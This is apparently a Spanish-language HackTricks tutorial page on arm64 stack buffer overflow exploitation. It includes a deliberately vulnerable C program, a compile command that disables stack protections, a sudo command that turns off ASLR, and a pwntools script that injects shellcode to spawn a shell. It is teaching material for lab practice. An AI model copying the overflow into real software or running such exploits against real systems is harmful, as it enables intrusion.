# Stack Shellcode - arm64

{{#include ../../../banners/hacktricks-training.md}}

Encuentra una introducción a arm64 en:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Código&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Compilar sin pie, canario y nx:
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
## No ASLR & No canary - Stack Overflow&#x20;

Para detener ASLR, ejecuta:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Para obtener el [**offset del bof revisa este enlace**](../ret2win/ret2win-arm64.md#finding-the-offset).

Explotar:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
La única cosa "complicada" de encontrar aquí sería la dirección en la pila a la que llamar. En mi caso, generé el exploit con la dirección encontrada usando gdb, pero luego, al explotarlo, no funcionó (porque la dirección de la pila cambió un poco).

Abrí el **`core` file** generado (`gdb ./bog ./core`) y verifiqué la dirección real del inicio del shellcode.

{{#include ../../../banners/hacktricks-training.md}}
